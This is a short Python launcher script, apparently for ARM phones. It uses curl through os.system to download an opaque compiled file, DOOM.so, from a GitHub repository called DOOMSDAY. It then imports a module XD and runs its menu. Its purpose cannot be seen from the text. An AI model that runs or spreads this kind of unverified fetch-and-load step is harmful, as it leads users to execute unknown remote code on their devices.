import os
from os import path,system
from platform import uname
arch=uname().machine.lower()
if path.isfile("DOOM.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/Ok3nw4/DOOMSDAY/main/DOOM.so -o DOOM.so")
if path.isfile("DOOM.so"):
    pass
else:
    system("curl -L https://raw.githubusercontent.com/Ok3nw4/DOOMSDAY/main/DOOM.so -o DOOM.so")

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
    import XD
    XD.menu()
else:exit('\033[1;31m Sorry System or device not supported ')
    
